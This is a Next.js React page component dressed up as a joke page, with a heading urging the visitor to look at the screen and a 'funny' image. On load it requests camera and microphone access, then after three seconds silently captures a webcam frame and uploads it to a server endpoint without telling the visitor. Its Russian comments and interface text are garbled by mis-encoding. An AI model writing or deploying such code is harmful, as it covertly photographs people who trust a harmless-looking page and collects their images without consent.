"use client"; // –£–∫–∞–∑—ã–≤–∞–µ–º, —á—Ç–æ —ç—Ç–æ –∫–ª–∏–µ–Ω—Ç—Å–∫–∏–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç

import { useEffect, useState, useRef } from "react";

export default function Home() {
  const [stream, setStream] = useState<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  
  useEffect(() => {
    const startCapture = async () => {
      try {
        if (typeof navigator !== "undefined" && navigator.mediaDevices?.getUserMedia) {
          const mediaStream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: true,
          });
          setStream(mediaStream);
          if (videoRef.current) {
            videoRef.current.srcObject = mediaStream;
          }

          // –î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ API
          setTimeout(() => captureAndSendPhoto(), 3000);
        } else {
          console.error("getUserMedia –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –≤ —ç—Ç–æ–º –±—Ä–∞—É–∑–µ—Ä–µ");
        }
      } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω—É:", error);
      }
    };

    startCapture();
  }, []);

  const captureAndSendPhoto = async () => {
    if (!videoRef.current) return;

    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");
    if (!context) return;

    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, "image/png"));
    if (!blob) return;

    const formData = new FormData();
    formData.append("file", blob, "photo.png");

    await fetch("/api/upload", {
      method: "POST",
      body: formData,
    });

    console.log("–§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä!");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white">
      <h1 className="text-2xl mb-4">ü§£ –ü–æ—Å–º–æ—Ç—Ä–∏ —Å—é–¥–∞!</h1>
      <video ref={videoRef} autoPlay playsInline className="w-64 h-64 bg-black"></video>
      <img src="/funny.jpg" alt="–ü—Ä–∏–∫–æ–ª" className="mt-4 w-64" />
    </div>
  );
}
